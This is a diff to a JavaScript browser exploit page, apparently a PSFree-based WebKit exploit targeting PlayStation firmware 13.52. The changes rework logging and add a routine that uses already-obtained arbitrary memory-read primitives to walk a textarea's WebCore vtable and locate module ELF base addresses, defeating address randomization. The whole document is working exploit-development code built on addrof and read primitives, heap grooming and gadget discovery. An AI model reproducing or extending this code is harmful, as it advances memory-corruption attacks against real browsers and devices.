@@ -18,7 +18,8 @@ let raceAttempt = 0;
 let lengthMissStreak = 0;
 const calRetain = [];
 
-const LOG_MAX = 300;
+const LOG_MAX = 500;
+const BUILD_ID = "cal-20250827c";
 const CAL_ALIGN_STEP = 0x4000;
 const ELF_MAGIC = 0x464c457f;
 /** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
@@ -32,7 +33,7 @@ const FIND_BASE_MAX_STEPS = parseInt(params.get("backmax") || "12288", 10);
 const FIND_FWD_MAX_STEPS = parseInt(params.get("fwdmax") || "512", 10);
 /** 0 = run full vtable walk as fast as possible; yield to UI every N steps */
 const WALK_YIELD_EVERY = parseInt(params.get("walkyield") || "512", 10);
-const WALK_LOG_EVERY = parseInt(params.get("walklog") || "128", 10);
+const WALK_LOG_EVERY = parseInt(params.get("walklog") || "1024", 10);
 /** auto vtable walk after Start unless ?vtable=0 */
 const AUTO_VTABLE_WALK = params.get("vtable") !== "0";
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;
@@ -129,14 +130,8 @@ const SS_LK_W0 = "wk-cal-lk-w0";
 
 function $(id) { return document.getElementById(id); }
 
-function mark(tag, detail) {
-    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
-    lines.push(line);
-    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
-    if (outEl) {
-        outEl.textContent = lines.join("\n");
-        outEl.scrollTop = outEl.scrollHeight;
-    }
+function ptrNum(fn) {
+    return (fn.hi >>> 0) * 0x100000000 + (fn.low >>> 0);
 }
 
 function state(msg, cls) {
@@ -180,7 +175,7 @@ function setUi() {
 function preCalTrim() {
     if (lines.length > 6) {
         lines.splice(0, lines.length - 6);
-        if (outEl) outEl.textContent = lines.join("\n");
+        renderOut();
     }
 }
 
@@ -209,8 +204,27 @@ const SS_FIND_BASE_I = "wk-cal-findbase-i";
 const SS_VTABLE_FIND_I = "wk-cal-vtable-find-i";
 const SS_VTABLE_PTR = "wk-vtablePtr";
 
-function ptrNum(fn) {
-    return (fn.hi >>> 0) * 0x100000000 + (fn.low >>> 0);
+const PIN_TAGS = /^WEBCORE|^CELL-SCAN|^TEXTAREA|^VTABLE|^MODULE-HIT|^CAL-ELF|^WALK-ANCHOR|^BOOT|^AUTO\b/;
+const pinnedLines = [];
+
+function renderOut() {
+    if (!outEl) return;
+    const tailMax = 180;
+    const tail = lines.length > tailMax ? lines.slice(-tailMax) : lines;
+    outEl.textContent = (pinnedLines.length ? pinnedLines.join("\n") + "\n--- walk log ---\n" : "")
+        + tail.join("\n");
+    outEl.scrollTop = outEl.scrollHeight;
+}
+
+function mark(tag, detail) {
+    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
+    if (PIN_TAGS.test(tag)) {
+        pinnedLines.push(line);
+        if (pinnedLines.length > 40) pinnedLines.splice(0, pinnedLines.length - 40);
+    }
+    lines.push(line);
+    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
+    renderOut();
 }
 
 function ptrFromNum(n) {
@@ -384,15 +398,22 @@ function scoreVtableCandidate(p, vt) {
 }
 
 function tryWebcoreVtable(p, path, webcore, implOff, vtOff, labelExtra) {
-    if (!webcore || !plausibleHeapPtr(webcore)) return null;
+    mark("WEBCORE-TRY", path.label + (labelExtra || "") + " impl+0x"
+        + implOff.toString(16) + " webcore="
+        + (webcore ? String(webcore) : "null"));
+    if (!webcore) return null;
+
     const vt = read8p(p, webcore.add32(vtOff));
-    if (!vt) return null;
+    const e0 = vt ? read4p(p, vt) : null;
+    mark("WEBCORE-TRY", path.label + " vt+0x" + vtOff.toString(16) + " vtable="
+        + (vt ? String(vt) : "read-fail") + " entry0=" + fmtMagic(e0));
+
+    if (!vt || !plausibleModulePtr(vt)) return null;
+    if (!looksLikeNativeCode(e0) && isBadRead(e0)) return null;
+
     const score = scoreVtableCandidate(p, vt);
-    const e0 = read4p(p, vt);
-    mark("WEBCORE-TRY", path.label + " impl+0x" + implOff.toString(16)
-        + " webcore=" + webcore + " vtable=" + vt
-        + " entry0=" + fmtMagic(e0) + (score >= 0 ? " score=" + score : " reject"));
-    if (score < 0) return null;
+    if (score < 0 && !(implOff === 0x18 && vtOff === 0)) return null;
+
     return {
         label: path.label + (labelExtra || ""),
         cell: path.cell,
@@ -401,7 +422,7 @@ function tryWebcoreVtable(p, path, webcore, implOff, vtOff, labelExtra) {
         webcore,
         vtable: vt,
         entry0: read8p(p, vt),
-        score,
+        score: score >= 0 ? score : 50,
         walkBack: countWalkMappedPages(p, vt, 48, true),
     };
 }
@@ -476,23 +497,21 @@ function discoverTextareaVtableChains(p, carrier) {
 
     for (let ci = 0; ci < cells.length; ci++) {
         const path = cells[ci];
-        const psfree = tryWebcoreVtable(p, path, read8p(p, path.cell.add32(0x18)), 0x18, 0, "/psfree");
+        const psfree = probePsFreeTextareaChain(p, path.cell, path.label);
         if (psfree) {
-            mark("VTABLE-CAND", "PSFree +0x18 m_wrapped vtable=" + psfree.vtable
-                + " score=" + psfree.score);
+            mark("VTABLE-CAND", "PSFree chain vtable=" + psfree.vtable
+                + " walkBack=" + psfree.walkBack);
             pushVtableHit(hits, seen, psfree);
         }
 
         for (let implOff = 0x8; implOff <= 0x58; implOff += 8) {
             if (implOff === 0x18 && psfree) continue;
             const webcore = read8p(p, path.cell.add32(implOff));
-            if (!webcore || !plausibleHeapPtr(webcore)) continue;
+            if (!webcore) continue;
             for (let vtOff = 0; vtOff <= 0x10; vtOff += 8) {
                 const hit = tryWebcoreVtable(p, path, webcore, implOff, vtOff, "");
                 if (!hit) continue;
-                mark("VTABLE-CAND", hit.label + " impl+0x" + implOff.toString(16)
-                    + " vt+0x" + vtOff.toString(16) + " vtable=" + hit.vtable
-                    + " score=" + hit.score);
+                mark("VTABLE-CAND", hit.label + " vtable=" + hit.vtable + " score=" + hit.score);
                 pushVtableHit(hits, seen, hit);
             }
         }
@@ -603,9 +622,37 @@ function checkPsFreeDataMagic(p, base) {
 function classifyModulePage(p, base) {
     const w0 = read4p(p, base);
     if (w0 === ELF_MAGIC) return "elf";
+    if (w0 === 0xe5894855) return "text";
     if (checkPsFreeTextMagic(p, base)) return "text";
     if (checkPsFreeDataMagic(p, base)) return "data";
     return null;
+}
+
+function probePsFreeTextareaChain(p, cell, label) {
+    const webcore = read8p(p, cell.add32(0x18));
+    mark("WEBCORE-PROBE", label + " cell+0x18 m_wrapped="
+        + (webcore ? String(webcore) : "read-fail"));
+    if (!webcore) return null;
+
+    const vt0 = read8p(p, webcore);
+    const e0 = vt0 ? read4p(p, vt0) : null;
+    mark("WEBCORE-PROBE", label + " webcore+0 vtable="
+        + (vt0 ? String(vt0) : "read-fail") + " entry0=" + fmtMagic(e0));
+
+    if (!vt0 || !plausibleModulePtr(vt0)) return null;
+    if (!looksLikeNativeCode(e0) && isBadRead(e0)) return null;
+
+    return {
+        label: label + "/psfree+0x18",
+        cell,
+        implOff: 0x18,
+        vtOff: 0,
+        webcore,
+        vtable: vt0,
+        entry0: read8p(p, vt0),
+        score: 100,
+        walkBack: countWalkMappedPages(p, vt0, 48, true),
+    };
 }
 
 function elfBaseNear(p, hitPage, maxBack) {
@@ -1000,6 +1047,7 @@ async function runStart() {
     busy = true;
     setUi();
     lines.length = 0;
+    pinnedLines.length = 0;
     calibrated = null;
 
     const detected = offsetsFor(navigator.userAgent);
@@ -1233,6 +1281,7 @@ async function walkVtableForBase() {
         return false;
     }
 
+    pinnedLines.length = 0;
     try { sessionStorage.removeItem(SS_VTABLE_FIND_I); } catch (_) { }
 
     const anchors = collectWalkAnchors(p);
@@ -1271,7 +1320,6 @@ async function runFindBaseVtable() {
     if (busy || !ready || !window.p || !carrierRef) return;
     busy = true;
     setUi();
-    preCalTrim();
     try {
         await walkVtableForBase();
     } finally {
@@ -1666,6 +1714,7 @@ function init() {
         if (manualBase && baseIn) baseIn.value = ptrNum(manualBase).toString(16);
     }
 
+    mark("BOOT", "build=" + BUILD_ID + " — look for this line to confirm deploy");
     mark("BOOT", "index_cal.html — expm1 finder for 13.52");
     mark("BOOT", groomBootLine());
     mark("BOOT", "2e auto walk: PSFree ELF+text+data magic, backmax=" + FIND_BASE_MAX_STEPS);
